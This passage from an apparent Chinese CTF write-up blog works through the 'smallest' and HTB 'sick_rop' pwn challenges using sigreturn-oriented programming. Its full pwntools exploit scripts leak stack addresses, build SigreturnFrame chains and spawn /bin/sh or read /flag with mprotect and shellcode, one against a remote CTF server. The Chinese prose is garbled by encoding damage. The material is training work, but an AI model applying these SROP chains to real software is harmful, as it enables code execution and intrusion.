SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rip = syscall_ret<br>fuck.rsp = <span class="hljs-number">0x402500</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0xdeadbeef</span>,rax_syscall_leave_ret,<span class="hljs-number">15</span>,fuck]<br>)<br>sl(payload)<br><br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = <span class="hljs-number">0x402500</span> + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rip = syscall_ret<br>wsnd.rsp = <span class="hljs-number">0xdeadbeef</span><br>wsnd.rbp = <span class="hljs-number">0xdeadbeef</span><br><span class="hljs-comment"># print(len((p64(0xdeadbeef)+p64(rax_syscall_leave_ret)+p64(15)+str(wsnd))))  !!! 272 !!!</span><br>sl((p64(<span class="hljs-number">0xdeadbeef</span>)+p64(rax_syscall_leave_ret)+p64(<span class="hljs-number">15</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>) <span class="hljs-comment"># bin_sh = 0x402500 + 0x200</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 id="smallestï¼ˆé€šè¿‡-read-å­—èŠ‚æ•°æ„é€ çš„-Sigreturnï¼‰"><a class="header-anchor" href="#smallestï¼ˆé€šè¿‡-read-å­—èŠ‚æ•°æ„é€ çš„-Sigreturnï¼‰">Â¶</a>smallestï¼ˆé€šè¿‡ read å­—èŠ‚æ•°æ„é€ çš„ Sigreturnï¼‰</h3><h4 id="åˆ†æ-v3"><a class="header-anchor" href="#åˆ†æ-v3">Â¶</a>åˆ†æ</h4><p>ç¨‹åºè¶Šæ¥è¶ŠçŸ­ï¼Œgaget è¶Šæ¥è¶Šå°‘ QWQã€‚è¿™ä¸ªç›¸å½“ç›´æ¥ï¼Œåœ¨ rsp å†™å¤„å†™ <code>0x400</code> çš„æ•°æ®ï¼Œå‰©ä¸‹çš„çˆ±å’‹å’‹åœ°ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329152145281.png" alt="image-20220329152145281"></p><p>å¹¶ä¸”è¿™é¢˜åœ¨è¿è¡Œæ—¶å¹¶æ²¡æœ‰ä¸€ä¸ªè¾ƒä¸ºå›ºå®šçš„å¯è¯»å¯å†™åœ°å€ï¼Œéœ€è¦ leak æ ˆåœ°å€ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329161716980.png" alt="image-20220329161716980"></p><p><strong>å…³é”®ç‚¹ï¼šx64 è°ƒç”¨çº¦å®šä¸­è¯´æ˜äº†å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼æ˜¯å­˜åœ¨ rax é‡Œé¢çš„ï¼Œè€Œ <code>SYS_read</code> è¿”å›å€¼æ˜¯è¯»å–çš„å­—èŠ‚ä¸ªæ•°ã€‚</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+<br>|<span class="hljs-string"> %rax  </span>|<span class="hljs-string"> Name  </span>|<span class="hljs-string"> Entry point  </span>|<span class="hljs-string"> Implementation   </span>|<br>+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+<br>|<span class="hljs-string"> 0     </span>|<span class="hljs-string"> read  </span>|<span class="hljs-string"> sys_read     </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>|<span class="hljs-string"> 1     </span>|<span class="hljs-string"> write </span>|<span class="hljs-string"> sys_write    </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+<br></code></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬å‘ç° write çš„è°ƒç”¨å·æ˜¯ 1 ï¼Œæ„æ€æ˜¯æˆ‘ä»¬åœ¨è¯»å…¥ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µä¸‹è·³è¿‡ <code>xor rax,rax</code> è¿™ä¸€æ­¥å°±ä¼š write å‡º rspã€‚</p><ol><li><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œå…ˆ read å¡å…¥ä¸‰ä¸ª <code>vuln_addr = 0x4000B0</code>ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹ï¼Œæ¯ä¸€æ¬¡ ret éƒ½æ‰§è¡Œä¸€æ¬¡ vulnã€‚</p></li><li><p>ç¬¬äºŒæ¬¡æ‰§è¡Œä»… read å¡å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œéƒ¨åˆ†è¦†ç›–æ‰è¿”å›åœ°å€ä¸º <code>NOxor_vuln = 0x4000B3</code> ã€‚</p></li><li><p>ç¬¬ä¸‰æ¬¡æ‰§è¡Œï¼Œç”±äº write <strong>ä¸å—</strong> <code>\x00</code> æˆªæ–­å½±å“ï¼Œåˆ° syscall æ—¶å°±ä¼šä» rsp æŒ‡é’ˆå¤„å¼€å§‹ leak å‡ºæ­¤æ—¶çš„æ ˆä¿¡æ¯ï¼ˆæ³¨æ„ä¸æ˜¯ rsp æŒ‡é’ˆåœ°å€ï¼Œä½†æ˜¯ä¼šè¾“å‡ºå¾ˆå¤šæ ˆå†…çš„åœ°å€ï¼‰ã€‚</p></li><li><p>ç¬¬å››æ¬¡æ‰§è¡Œï¼Œread å¡å…¥ <code>vuln_addr</code> ä»¥åŠ Frameã€‚</p></li><li><p>ç¬¬äº”æ¬¡æ‰§è¡Œï¼Œread å¡å…¥ <code>syscall;ret</code>  åœ°å€ä»¥åŠ Frame å‰ 7 ä¸ªå­—èŠ‚ï¼ˆå‡‘é½ <code>RAX = 15</code>ï¼‰ã€‚</p></li><li><p>åˆ°è¿™å°±å’Œä¸Šé¢˜å·®ä¸å¤šäº†ï¼Œç¬¬ä¸€ä¸ª Frame è¯»å…¥ ROP é“¾ï¼Œç¬¬äºŒä¸ª Frame æ‰§è¡Œ <code>/bin/sh\0</code>ã€‚ä¸è¿‡ ROP æ„é€ è¿˜æ˜¯è¦å…ˆè¯»å…¥ä¸€æ¬¡ï¼Œåç»­å‡‘æ»¡ 15 å­—èŠ‚è¿™æ ·åˆ©ç”¨ã€‚ç†Ÿæ‚‰æµç¨‹åéš¾åº¦ä¸å¤§ã€‚</p></li></ol><h4 id="Exp-execve"><a class="header-anchor" href="#Exp-execve">Â¶</a>Exp(execve)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26278)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = stack_addr + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="Exp-orw"><a class="header-anchor" href="#Exp-orw">Â¶</a>Exp(orw)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./smallest&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26278</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">10</span><br>wsnd.rdi = (stack_addr&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>wsnd.rsi = <span class="hljs-number">0x1000</span><br>wsnd.rdx = <span class="hljs-number">7</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>se(p64(stack_addr+<span class="hljs-number">0x200</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>å˜é‡åæ˜¯ä¸æ˜¯å¾ˆå¸…ï¼Œæ²¡å•¥ç”¨ï¼Œå°±æœ¬åœ°æ‰“é€šï¼Œ ğŸ’¨ è¿œç¨‹ä¸€ä¸ªéƒ½æ‰“ä¸é€šï¼Œrun äº† run äº†ã€‚</p><hr><p><em><strong>2022/5/4 0:18 è¡¥å……</strong></em>ï¼š<strong>SROP åœ¨æ²¡åœ°æ–¹è½è„šï¼ˆæŒ‡å†™ rsp æˆ–è€… rip çš„æ—¶å€™ï¼‰ï¼Œä¸€å®šè®°å¾— vmmap ä¹‹å <code>x/100xg</code> æŸ¥çœ‹ä¸€ä¸‹ä»£ç æ®µæœ‰æ—  text æ®µæŒ‡é’ˆå¯ä»¥å½“è·³æ¿ã€‚</strong></p><h3 id="HTB-sick-ropï¼ˆæ‰¬-text-æ®µï¼‰"><a class="header-anchor" href="#HTB-sick-ropï¼ˆæ‰¬-text-æ®µï¼‰">Â¶</a>HTB - sick_ropï¼ˆæ‰¬ text æ®µï¼‰</h3><p>ç”±äºç½‘ç»œåŸå› è¿œç¨‹æ²¡æ‰“é€šï¼Œç½¢ ğŸ¦ ã€‚ä¸»è¦æ˜¯åˆ©ç”¨ä»£ç æ®µæ®‹ç•™çš„æŒ‡é’ˆï¼Œè¿™é‡Œå¯ä»¥å†™ä¿©æ¬¡ SROP æ‰§è¡Œ <code>/bin/sh\0</code> getshellã€‚</p><p>ä½†æ˜¯å†™ <code>mprotect</code> å…¶å®çœŸçš„åªç”¨å†™ä¸€æ¬¡ç„¶åæ”¹ rip å°±è¡Œäº†ã€‚å› ä¸ºæ²¡æœ‰å…¶ä»–çš„åœ°å€å¯ä»¥è½è„šï¼Œç›´æ¥æŠŠ<strong>æ•´ä¸ªä»£ç æ®µæ‰¬æˆ <code>rwx</code> å°±å¥½äº†</strong>QwQã€‚éå¸¸æ»´ç‹‚é‡å¿«ä¹ crazy ä¸è®²é“ç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory 